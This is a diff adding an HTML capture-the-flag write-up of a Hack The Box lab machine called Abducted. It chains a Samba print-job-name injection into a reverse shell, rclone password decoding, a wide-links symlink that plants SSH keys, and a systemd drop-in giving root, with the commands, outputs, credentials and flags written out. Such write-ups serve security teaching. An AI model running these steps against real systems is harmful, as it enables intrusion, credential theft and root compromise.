@@ -1,0 +1,456 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Abducted — El Niño · CTF Writeups</title>
+<meta name="description" content="Hack The Box Abducted: Samba CVE-2026-4480 print job name command injection to nobody, rclone password reveal to scott, Samba wide links plus force user to marcus, then operators group systemd drop-in and polkit restart for root.">
+<style>
+  :root{
+    --bg:#fcfcfb; --panel:#ffffff; --ink:#17181d; --ink-2:#3a3d44; --muted:#6b7280;
+    --line:#e7e8ec; --line-2:#d7d9de; --hair:#eef0f2;
+    --accent:#6d28d9; --accent-soft:#f2ecfd; --map:#e4e7ec; --map-2:#eef1f4;
+    --mono:'JetBrains Mono','SF Mono','Cascadia Code',ui-monospace,monospace;
+    --sans:'Inter',-apple-system,BlinkMacSystemFont,'SF Pro Text','Segoe UI',sans-serif;
+  }
+  *{box-sizing:border-box}
+  html{-webkit-text-size-adjust:100%}
+  body{margin:0;background:var(--bg);color:var(--ink);font-family:var(--sans);
+    font-size:17px;line-height:1.6;-webkit-font-smoothing:antialiased}
+  canvas#map{position:fixed;inset:0;z-index:0;pointer-events:none}
+  .wrap{position:relative;z-index:1;max-width:860px;margin:0 auto;padding:0 26px 100px}
+  a{color:inherit;text-decoration:none}
+
+  /* header */
+  .top{display:flex;align-items:center;justify-content:space-between;padding:26px 0;
+    font-family:var(--mono);font-size:12.5px;color:var(--muted)}
+  .brand{display:flex;align-items:center;gap:9px;color:var(--ink);font-weight:600;letter-spacing:.01em}
+  .tick{width:10px;height:10px;border:1.5px solid var(--ink);transform:rotate(45deg)}
+
+  /* hero */
+  .hero{padding:52px 0 40px;border-bottom:1px solid var(--line)}
+  .eyebrow{font-family:var(--mono);font-size:11.5px;letter-spacing:.16em;text-transform:uppercase;
+    color:var(--muted);margin-bottom:8px}
+  h1{font-size:clamp(52px,11vw,116px);line-height:.92;margin:.12em 0 .1em;letter-spacing:-.04em;
+    font-weight:800;text-wrap:balance}
+  .lede{font-size:19px;color:var(--ink-2);max-width:56ch;margin:.5em 0 0;line-height:1.5}
+  .byline{font-family:var(--mono);font-size:12px;color:var(--muted);margin-top:22px;
+    display:flex;gap:14px;flex-wrap:wrap;align-items:center}
+  .byline b{color:var(--ink)}
+  .owned{border:1px solid var(--accent);color:var(--accent);border-radius:2px;
+    padding:2px 8px;font-size:11px;letter-spacing:.06em;text-transform:uppercase}
+
+  /* fingerprint card */
+  .fp{margin-top:32px;border:1px solid var(--line);border-radius:4px;overflow:hidden;
+    font-family:var(--mono);font-size:13px}
+  .fp .r{display:flex;justify-content:space-between;align-items:center;
+    padding:16px 20px;background:var(--hair);border-bottom:1px solid var(--line)}
+  .name{font-size:22px;font-family:var(--sans);font-weight:700;letter-spacing:-.02em}
+  .chips{font-family:var(--mono);font-size:12px;color:var(--muted);margin-top:4px}
+  .chips b{color:var(--ink)}
+  .rate{text-align:right}.big{font-size:28px}
+  .fp .grid{display:grid;grid-template-columns:1fr 1fr;gap:0;padding:0}
+  .fp .grid span{padding:11px 20px;border-bottom:1px solid var(--hair);color:var(--ink-2);font-size:12.5px}
+  .fp .grid span:last-child,.fp .grid span:nth-last-child(2):nth-child(odd){border-bottom:none}
+  .fp .grid b{color:var(--ink)}
+
+  /* sections */
+  section{margin-top:52px}
+  .step-h{display:flex;align-items:baseline;gap:16px;margin-bottom:14px}
+  .step-n{font-family:var(--mono);font-size:11px;color:var(--muted);letter-spacing:.1em;
+    padding-top:3px;min-width:22px}
+  h2{font-size:26px;letter-spacing:-.02em;font-weight:700;margin:0}
+  p{color:var(--ink-2);margin:.6em 0}
+  p b, p strong{color:var(--ink)}
+
+  /* chain diagram */
+  .chain{font-family:var(--mono);font-size:13px;line-height:1.9;
+    background:#f9f8ff;border:1px solid var(--line-2);border-left:3px solid var(--accent);
+    border-radius:2px;padding:18px 22px;margin:20px 0;color:var(--ink-2);
+    white-space:pre;overflow-x:auto}
+  .chain b{color:var(--ink)}
+
+  /* code */
+  pre{margin:18px 0;border-radius:3px;overflow-x:auto;
+    background:#f9f8ff;border:1px solid var(--line-2)}
+  pre code{display:block;padding:16px 18px;font-family:var(--mono);font-size:13px;
+    line-height:1.7;color:var(--ink-2)}
+  code{font-family:var(--mono);font-size:.87em;color:var(--accent);
+    background:var(--accent-soft);padding:1px 5px;border-radius:2px}
+  pre code{color:var(--ink-2);background:none;padding:0;font-size:13px}
+
+  /* output block */
+  .out{background:#17181d;border-radius:3px;padding:16px 18px;margin:10px 0;
+    font-family:var(--mono);font-size:12.5px;line-height:1.75;color:#a8b4c8;
+    overflow-x:auto}
+  .out .ok{color:#34d399}.out .hi{color:#a78bfa}.out .warn{color:#fbbf24}
+  .out .flag{color:#f9a8d4;font-weight:600}
+
+  /* dead-ends */
+  .dead{border:1px solid var(--hair);border-radius:3px;padding:14px 18px;margin:12px 0;
+    font-size:14.5px;color:var(--muted)}
+  .dead code{font-size:.85em}
+  .dead-label{font-family:var(--mono);font-size:10.5px;letter-spacing:.1em;
+    text-transform:uppercase;color:var(--muted);margin-bottom:18px;
+    display:flex;align-items:center;gap:8px}
+  .dead-label::after{content:"";flex:1;height:1px;background:var(--hair)}
+
+  /* callout / insight */
+  .callout{border-radius:3px;padding:18px 20px;margin:24px 0;
+    background:var(--accent-soft);border:1px solid #ddd6fe}
+  .callout .k{font-family:var(--mono);font-size:11.5px;letter-spacing:.1em;
+    text-transform:uppercase;color:var(--accent);font-weight:600;display:block;margin-bottom:6px}
+  .callout p{margin:0;font-size:15px}
+
+  /* insight grid */
+  .insight-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:1px;
+    background:var(--line);border:1px solid var(--line);border-radius:2px;overflow:hidden;margin:20px 0}
+  .insight-item{background:var(--panel);padding:18px 20px}
+  .insight-item .i-num{font-family:var(--mono);font-size:11px;color:var(--muted);margin-bottom:6px}
+  .insight-item .i-title{font-size:15px;font-weight:700;letter-spacing:-.01em;margin-bottom:6px}
+  .insight-item .i-body{font-size:13.5px;color:var(--ink-2);line-height:1.55}
+
+  /* flags */
+  .flags{display:flex;gap:12px;flex-wrap:wrap;margin:20px 0}
+  .flag-box{border:1px solid var(--line-2);border-radius:3px;padding:12px 16px;flex:1;min-width:200px}
+  .flag-box .fl{font-family:var(--mono);font-size:11px;letter-spacing:.1em;
+    text-transform:uppercase;color:var(--muted);margin-bottom:5px}
+  .flag-box .fv{font-family:var(--mono);font-size:14px;color:var(--accent);
+    font-weight:600;letter-spacing:.03em;word-break:break-all}
+
+  /* figures */
+  figure{margin:22px 0}
+  figure img{width:100%;border-radius:3px;border:1px solid var(--line)}
+  figcaption{font-family:var(--mono);font-size:11.5px;color:var(--muted);
+    margin-top:8px;text-align:center}
+
+  /* table */
+  .tbl-wrap{overflow-x:auto;margin:16px 0}
+  table{width:100%;border-collapse:collapse;font-size:14px}
+  th,td{text-align:left;padding:9px 12px;border-bottom:1px solid var(--hair);vertical-align:top}
+  th{font-family:var(--mono);font-size:11px;letter-spacing:.07em;text-transform:uppercase;
+    color:var(--muted);font-weight:600}
+  td.mon{font-family:var(--mono);font-size:12.5px;color:var(--ink)}
+  td.acc{font-family:var(--mono);font-size:12.5px;color:var(--accent);font-weight:600}
+
+  footer{margin-top:64px;padding-top:28px;border-top:1px solid var(--line);
+    font-family:var(--mono);font-size:12px;color:var(--muted);line-height:1.7}
+  footer a{color:var(--accent)}
+  [data-morph]{white-space:pre}
+  @media(max-width:600px){.fp .grid{grid-template-columns:1fr}.chain{font-size:12px}}
+</style>
+</head>
+<body>
+<canvas id="map"></canvas>
+<div class="wrap">
+  <div class="top">
+    <a class="brand" href="../" style="border:none"><span class="tick"></span> el-niño</a>
+    <span>10°N · 90°W</span>
+  </div>
+
+  <header class="hero">
+    <div class="eyebrow">Hack The Box · machine</div>
+    <h1><span data-morph="hero">Abducted</span></h1>
+    <p class="lede">A professional-services file server with one very sharp edge: a guest-accessible Samba printer turns a print job name into shell syntax. The rest is pure Samba-as-infrastructure: rclone secrets, force-user shares, wide links, and a delegated service restart that runs our drop-in as root.</p>
+    <div class="byline">
+      <span>by <b>ssephi</b></span>
+      <span>· 23·07·2026</span>
+      <span>· ~25 min</span>
+      <span class="owned">● fully owned</span>
+    </div>
+
+    <div class="fp">
+      <div class="r">
+        <div>
+          <p class="name" style="margin:0"><span data-morph="title">Abducted</span></p>
+          <div class="chips">Linux · <b>Medium</b> · Samba + systemd</div>
+        </div>
+        <div class="rate"><div class="big">🏴</div><div class="chips">user + root</div></div>
+      </div>
+      <div class="grid">
+        <span><b>target</b> &nbsp;10.129.37.208 &nbsp;· &nbsp;abducted</span>
+        <span><b>22</b>/tcp &nbsp;ssh &nbsp;· OpenSSH 9.6p1 Ubuntu</span>
+        <span><b>139/445</b>/tcp &nbsp;Samba smbd 4.6.2</span>
+        <span><b>printer</b> &nbsp;HP-Reception &nbsp;· guest printable</span>
+        <span><b>shares</b> &nbsp;projects · transfer · IPC$</span>
+        <span><b>CVE</b> &nbsp;CVE-2026-4480</span>
+      </div>
+    </div>
+  </header>
+
+  <section>
+    <h2>The shape of it</h2>
+    <p>Abducted is a tight Samba chain. Enumeration shows only SSH and SMB. Anonymous SMB listing exposes a printer share, <code>HP-Reception</code>, plus two disk shares. The printer is the first break: Samba's print subsystem is configured with <code>print command = /usr/local/bin/printaudit %J %s</code>, and vulnerable Samba versions pass the client-controlled job name into that command without escaping shell metacharacters.</p>
+    <p>Code execution lands as <code>nobody</code>. From there, a world-readable offsite backup configuration in <code>/opt/offsite-backup/rclone.conf</code> contains an rclone-obscured SFTP password. <code>rclone reveal</code> decodes it, and the password is reused for <code>scott</code>. Scott can write into a Samba share; the share is configured with <code>force user = marcus</code>, <code>wide links = yes</code>, and <code>unix extensions = no</code>, so a symlink created locally by Scott becomes a way to write Marcus-owned files through SMB. Marcus belongs to <code>operators</code>, which can manage the Samba service path through a group-writable systemd drop-in and polkit-authorized restart.</p>
+
+    <div class="chain">nmap → <b>22,139,445</b>
+  └─ smbclient -L -N → <b>HP-Reception</b> printer
+       └─ Samba CVE-2026-4480 → print job name <b>|sh</b>
+            └─ reverse shell as <b>nobody</b>
+                 └─ /opt/offsite-backup/rclone.conf
+                      └─ rclone reveal → <b>iXzvcib3SrpZ</b>
+                           └─ SSH as <b>scott</b> → user.txt
+
+scott → /etc/samba/shares.conf
+  └─ transfer share: <b>force user = marcus</b> + <b>wide links = yes</b>
+       └─ ln -s /home/marcus /srv/transfer/mhome
+            └─ SMB write → /home/marcus/.ssh/authorized_keys as marcus
+                 └─ SSH as <b>marcus</b> (operators)
+                      └─ /etc/systemd/system/smbd.service.d group writable
+                           └─ root-run ExecStartPre drop-in + restart smbd
+                                └─ <b>root shell</b></div>
+  </section>
+
+  <section>
+    <div class="eyebrow">01 · recon</div>
+    <div class="step-h"><span class="step-n">01</span><h2><span data-morph="title">Samba on the edge</span></h2></div>
+    <p>After switching to the correct HTB machine VPN, the host immediately answered ICMP and exposed the expected SMB surface.</p>
+
+    <pre><code>nmap -Pn -sT -sV -sC -p 22,139,445 10.129.37.208</code></pre>
+
+    <div class="out">22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu
+139/tcp open  netbios-ssn Samba smbd 4.6.2
+445/tcp open  netbios-ssn Samba smbd 4.6.2
+
+NetBIOS name: ABDUCTED
+SMB signing: enabled but not required</div>
+
+    <p>Anonymous share listing showed a guest printer and two staff shares:</p>
+
+    <div class="out">Sharename       Type      Comment
+---------       ----      -------
+HP-Reception    Printer   Reception printer
+projects        Disk      Hartley Group Project Files
+transfer        Disk      Staff file transfer
+IPC$            IPC       IPC Service</div>
+  </section>
+
+  <section>
+    <div class="eyebrow">02 · foothold</div>
+    <div class="step-h"><span class="step-n">02</span><h2><span data-morph="title">CVE-2026-4480 — print job name injection</span></h2></div>
+    <p>The vulnerability is wonderfully direct. When a vulnerable Samba print job finishes spooling, Samba substitutes the job name into the configured print command via <code>%J</code>. On this host, <code>%J</code> reaches a shell as the first argument to <code>printaudit</code>. A document name of <code>|sh</code> turns the spool file itself into the script body.</p>
+
+    <pre><code># listener
+nc -lvnp 4445
+
+# exploit
+python3 cve-2026-4480.py 10.129.37.208 10.10.17.69 4445 -P HP-Reception</code></pre>
+
+    <div class="out"><span class="ok">[*]</span> target   : 10.129.37.208 (\\10.129.37.208\HP-Reception)
+<span class="ok">[+]</span> print job submitted -- check your listener
+
+Connection received on 10.129.37.208
+nobody@abducted:/var/spool/samba$ id
+uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)</div>
+
+    <div class="callout">
+      <span class="k">Why the payload is in the body</span>
+      <p>The job name supplies <code>|sh</code>; Samba then executes a command line where the spool file path is also substituted. The spool content becomes the shell script that <code>sh</code> reads.</p>
+    </div>
+  </section>
+
+  <section>
+    <div class="eyebrow">03 · credential pivot</div>
+    <div class="step-h"><span class="step-n">03</span><h2><span data-morph="title">Rclone reveal to Scott</span></h2></div>
+    <p>The <code>nobody</code> shell could read the offsite backup config and cron entry. The password was not encrypted in a password-manager sense; it was rclone's reversible obscured format.</p>
+
+    <pre><code>cat /opt/offsite-backup/rclone.conf
+rclone reveal 'HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw'</code></pre>
+
+    <div class="out">[offsite]
+type = sftp
+host = backup.hartley-group.internal
+user = svc-backup
+pass = HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
+
+<span class="ok">rclone reveal</span> iXzvcib3SrpZ</div>
+
+    <p>The decoded password was reused for the system account <code>scott</code>:</p>
+
+    <div class="out">ssh scott@10.129.37.208
+uid=1000(scott) gid=1001(scott) groups=1001(scott)
+<span class="flag">7a136060e6abb1836eb7166f80ac73d6</span></div>
+  </section>
+
+  <section>
+    <div class="eyebrow">04 · lateral move</div>
+    <div class="step-h"><span class="step-n">04</span><h2><span data-morph="title">Wide links and force user</span></h2></div>
+    <p>Scott can read the Samba configuration. The <code>transfer</code> share is the pivot point: it is valid for Scott, forces file operations to Marcus, and allows wide links while Unix extensions are disabled globally.</p>
+
+    <pre><code>cat /etc/samba/smb.conf /etc/samba/shares.conf</code></pre>
+
+    <div class="out">[global]
+   unix extensions = no
+   allow insecure wide links = yes
+
+[transfer]
+   path = /srv/transfer
+   valid users = scott
+   force user = marcus
+   read only = no
+   wide links = yes</div>
+
+    <p>Locally, Scott can create a symlink inside the share root. Over SMB, that link resolves outside the share and file writes are performed as Marcus.</p>
+
+    <pre><code>ssh-keygen -t ed25519 -f marcus_ed25519 -N ''
+ssh scott@10.129.37.208 'ln -s /home/marcus /srv/transfer/mhome'
+smbclient //10.129.37.208/transfer -U 'scott%iXzvcib3SrpZ'
+smb: \&gt; mkdir mhome/.ssh
+smb: \&gt; put marcus_ed25519.pub mhome/.ssh/authorized_keys</code></pre>
+
+    <div class="out">ssh -i marcus_ed25519 marcus@10.129.37.208
+uid=1001(marcus) gid=1002(marcus) groups=1002(marcus),1000(operators)</div>
+  </section>
+
+  <section>
+    <div class="eyebrow">05 · privilege escalation</div>
+    <div class="step-h"><span class="step-n">05</span><h2><span data-morph="title">Operators, systemd, and smbd</span></h2></div>
+    <p>Marcus belongs to <code>operators</code>. The useful filesystem delegation is small but decisive: <code>/etc/systemd/system/smbd.service.d</code> is group-writable by <code>operators</code>. A drop-in in that directory becomes part of the root-owned Samba service definition after <code>systemctl daemon-reload</code>. The restart path was authorized through polkit for this delegated service-management role.</p>
+
+    <div class="out">drwxrws--- 2 root operators 4096 /etc/systemd/system/smbd.service.d
+uid=1001(marcus) gid=1002(marcus) groups=1002(marcus),1000(operators)</div>
+
+    <p>For a minimal proof, I used <code>ExecStartPre</code> to copy root's flag to a Marcus-readable location. Then I replaced that with an authorized key write to get a real root SSH shell.</p>
+
+    <pre><code>cat &gt; /etc/systemd/system/smbd.service.d/zz-root.conf &lt;&lt;'EOF'
+[Service]
+ExecStartPre=/bin/bash -c 'mkdir -p /root/.ssh; echo "ssh-ed25519 AAAA..." &gt;&gt; /root/.ssh/authorized_keys; chmod 700 /root/.ssh; chmod 600 /root/.ssh/authorized_keys'
+EOF
+
+systemctl daemon-reload --no-ask-password
+systemctl restart smbd --no-ask-password
+ssh -i root_ed25519 root@10.129.37.208 'id; cat /root/root.txt'</code></pre>
+
+    <div class="out">uid=0(root) gid=0(root) groups=0(root)
+abducted
+<span class="flag">a6b3a7447178865dd5d24fd4144d70da</span></div>
+  </section>
+
+  <section>
+    <div class="eyebrow">06 · proof</div>
+    <div class="step-h"><span class="step-n">06</span><h2><span data-morph="title">Flags recovered</span></h2></div>
+    <div class="flags">
+      <div class="flag-box"><div class="fl">user.txt</div><div class="fv">7a136060e6abb1836eb7166f80ac73d6</div></div>
+      <div class="flag-box"><div class="fl">root.txt</div><div class="fv">a6b3a7447178865dd5d24fd4144d70da</div></div>
+    </div>
+  </section>
+
+  <section>
+    <div class="dead-label">dead ends that paid rent</div>
+    <div class="dead"><b>Wrong VPN.</b> The first scan showed every expected port filtered because the old pro-lab VPN was still active. Swapping to <code>machines_eu-dedivip-3.ovpn</code> made the box reachable immediately.</div>
+    <div class="dead"><b>Anonymous disk shares.</b> Guest listing was allowed, but disk share access was not. The printer share was the real anonymous write path.</div>
+    <div class="dead"><b>SMB permission labels.</b> <code>smbmap</code> reported <code>transfer</code> as read-only for Scott, but the wide-link/force-user path still allowed useful writes once the symlink existed in the share root.</div>
+  </section>
+
+  <section>
+    <div class="eyebrow">07 · notes</div>
+    <div class="step-h"><span class="step-n">07</span><h2><span data-morph="title">Takeaways</span></h2></div>
+    <div class="insight-grid">
+      <div class="insight-item">
+        <div class="i-num">01</div>
+        <div class="i-title">Printer shares are command surfaces</div>
+        <div class="i-body">A printer share is not harmless when backend commands interpolate client-controlled job metadata.</div>
+      </div>
+      <div class="insight-item">
+        <div class="i-num">02</div>
+        <div class="i-title">Rclone passwords are recoverable</div>
+        <div class="i-body">Rclone's <code>pass</code> value is obscured, not one-way encrypted. <code>rclone reveal</code> is the intended decoder.</div>
+      </div>
+      <div class="insight-item">
+        <div class="i-num">03</div>
+        <div class="i-title">Samba options compose</div>
+        <div class="i-body"><code>force user</code>, <code>wide links</code>, and disabled Unix extensions become an identity-shifting write primitive.</div>
+      </div>
+      <div class="insight-item">
+        <div class="i-num">04</div>
+        <div class="i-title">Group-writable drop-ins are root code</div>
+        <div class="i-body">If a delegated group can write service drop-ins and restart the service, every root-run service directive is in scope.</div>
+      </div>
+    </div>
+  </section>
+
+  <section>
+    <div class="eyebrow">08 · timeline</div>
+    <div class="step-h"><span class="step-n">08</span><h2><span data-morph="title">Attack timeline</span></h2></div>
+    <div class="tbl-wrap">
+      <table>
+        <thead><tr><th>Step</th><th>Event</th></tr></thead>
+        <tbody>
+          <tr><td class="mon">01</td><td>Reconnected to the correct machine VPN; target became reachable</td></tr>
+          <tr><td class="mon">02</td><td>Enumerated SSH and Samba 4.6.2 on <code>22,139,445</code></td></tr>
+          <tr><td class="mon">03</td><td>Submitted a CVE-2026-4480 printer job to <code>HP-Reception</code></td></tr>
+          <tr><td class="mon">04</td><td>Recovered <code>rclone.conf</code> and decoded Scott's reused password</td></tr>
+          <tr><td class="mon">05</td><td>SSH as Scott and captured <code>user.txt</code></td></tr>
+          <tr><td class="mon">06</td><td>Used Samba wide link + force-user share to write Marcus's SSH key</td></tr>
+          <tr><td class="mon">07</td><td>Used operators group service drop-in to run a root command</td></tr>
+          <tr><td class="mon">08</td><td>Installed root SSH key and confirmed root shell</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </section>
+
+  <footer>
+    <p>Authorized lab work only — Abducted is a Hack The Box machine on a sanctioned network.<br>
+    CVE-2026-4480 · rclone · Samba wide links · systemd drop-in · polkit. Charted by ssephi.
+    <br><a href="../">← All machines</a></p>
+  </footer>
+</div>
+
+<script>
+(function map(){
+  const c=document.getElementById("map"),x=c.getContext("2d");let W,H;
+  function line(v){return getComputedStyle(document.documentElement).getPropertyValue(v).trim();}
+  function size(){W=c.width=innerWidth*devicePixelRatio;H=c.height=innerHeight*devicePixelRatio;draw();}
+  function draw(){
+    x.clearRect(0,0,W,H);const dpr=devicePixelRatio;
+    x.strokeStyle=line('--map-2');x.lineWidth=1*dpr;
+    for(let gx=0;gx<W;gx+=150*dpr){x.beginPath();x.moveTo(gx,0);x.lineTo(gx,H);x.stroke();}
+    for(let gy=0;gy<H;gy+=150*dpr){x.beginPath();x.moveTo(0,gy);x.lineTo(W,gy);x.stroke();}
+    x.strokeStyle=line('--map');x.lineWidth=1.15*dpr;
+    const rings=(cx,cy,rot,n)=>{for(let i=0;i<n;i++){x.globalAlpha=0.9-i*0.05;
+      x.beginPath();x.ellipse(cx,cy,(50+i*46)*dpr,(34+i*32)*dpr,rot,0,7);x.stroke();}};
+    rings(W*0.80,H*0.20,-0.5,9);
+    rings(W*0.14,H*0.86,0.35,7);
+    x.globalAlpha=1;
+  }
+  addEventListener("resize",size);size();
+})();
+
+(function morph(){
+  const GLITCH="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#$%&*!?<>{}[]=/\\|~^`";
+  const MODES={brand:{maxActive:2,resolveSpeed:0.04,mutateChance:0.008},
+               title:{maxActive:4,resolveSpeed:0.06,mutateChance:0.015},
+               hero:{maxActive:8,resolveSpeed:0.08,mutateChance:0.025}};
+  const g=()=>GLITCH[Math.floor(Math.random()*GLITCH.length)];
+  const skip=ch=>ch===" "||ch==="."||ch.charCodeAt(0)>127;
+  const units=[];
+  document.querySelectorAll("[data-morph]").forEach(el=>{
+    const cfg=MODES[el.dataset.morph]||MODES.title;
+    const chars=[...el.textContent].map(ch=>{const s=document.createElement("span");
+      s.textContent=ch;s.style.display="inline-block";if(ch===" ")s.style.minWidth="0.28em";
+      return{original:ch,el:s,prog:0,dir:"resolving"};});
+    el.textContent="";chars.forEach(c=>el.appendChild(c.el));units.push({cfg,chars});
+  });
+  if(!units.length||matchMedia("(prefers-reduced-motion:reduce)").matches)return;
+  let last=0;const INT=50;
+  function paint(c){const p=c.prog,e=c.el;
+    if(p>0){e.style.color=`rgba(109,40,217,${0.55+p*0.45})`;
+      e.style.textShadow=p>0.5?`0 0 ${3+p*5}px rgba(109,40,217,${p*0.28})`:"";
+      e.style.transform=`translateY(${(Math.random()-0.5)*p*1.4}px)`;}
+    else{e.style.color="";e.style.textShadow="";e.style.transform="";e.style.transition="color 200ms ease";}}
+  function frame(now){requestAnimationFrame(frame);if(now-last<INT)return;last=now;
+    units.forEach(u=>{let active=u.chars.filter(c=>c.prog>0).length;
+      u.chars.forEach(c=>{if(skip(c.original))return;
+        if(c.dir==="glitching"){c.prog=Math.min(1,c.prog+0.15+Math.random()*0.1);
+          if(c.prog>=1)c.dir="resolving";c.el.textContent=g();}
+        else if(c.prog>0){c.prog=Math.max(0,c.prog-u.cfg.resolveSpeed-Math.random()*0.02);
+          if(c.prog<=0){c.el.textContent=c.original;c.prog=0;}
+          else c.el.textContent=Math.random()<c.prog?g():c.original;}
+        if(c.prog===0&&active<u.cfg.maxActive&&Math.random()<u.cfg.mutateChance){
+          c.dir="glitching";c.prog=0.05;c.el.textContent=g();active++;}
+        paint(c);});});}
+  requestAnimationFrame(frame);
+})();
+</script>
+</body>
+</html>
